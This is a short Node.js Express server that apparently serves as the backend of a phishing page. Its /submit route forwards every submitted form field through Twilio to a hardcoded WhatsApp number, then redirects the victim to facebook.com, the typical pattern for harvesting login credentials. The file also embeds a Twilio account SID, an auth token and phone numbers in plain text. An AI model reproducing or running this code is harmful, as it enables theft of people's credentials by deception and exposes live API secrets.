import express, { urlencoded } from 'express';
import fs from 'fs'
const app = express();
const port = 3000;

const accountSid = 'ACffb87ccf579e74a80a6f1ee1ae491ddc';
const authToken = 'e257e3ca25d3dc79580a5fe106f93e81';
const client = require('twilio')(accountSid, authToken);


// Middleware to parse form data
app.use(urlencoded({ extended: true }));

app.get('/', (req, res) =>{
  res.send('launched');
});

// Route to handle form submission
app.post('/submit', (req, res) => {
  // Extract form data
  const formData = req.body;
  client.messages
  .create({
     from: 'whatsapp:+16593997860', // Twilio WhatsApp number
     body: `${JSON.stringify(formData)}`,
     to: 'whatsapp:+919725030987' // WhatsApp number of the recipient
   })
  .then(message => console.log(message.sid))
  .catch(err => console.error(err));

  res.redirect('https://facebook.com');
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
